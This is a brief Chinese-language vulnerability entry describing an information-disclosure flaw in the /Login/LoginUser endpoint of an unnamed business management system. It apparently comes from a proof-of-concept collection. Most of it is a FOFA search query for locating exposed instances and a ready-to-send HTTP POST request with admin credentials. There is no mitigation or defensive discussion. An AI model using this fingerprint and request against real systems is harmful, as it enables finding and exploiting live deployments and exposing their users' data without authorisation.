# 某业务管理系统LoginUser存在信息泄露漏洞

某业务管理系统LoginUser存在信息泄露漏洞

## fofa

```yaml
body="/Content/LayuiAdmin/login/css/index.css"
```

## poc

```
POST /Login/LoginUser HTTP/1.1
Host: your-ip
Content-Length: 79
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive

{"RecordID":"admin","password":"11111","undefined":"登录","language":"zh-CN"}
```

![image-20240821111211654](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408211112724.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/L9_i0oTvhkAAPu94YzAL4Q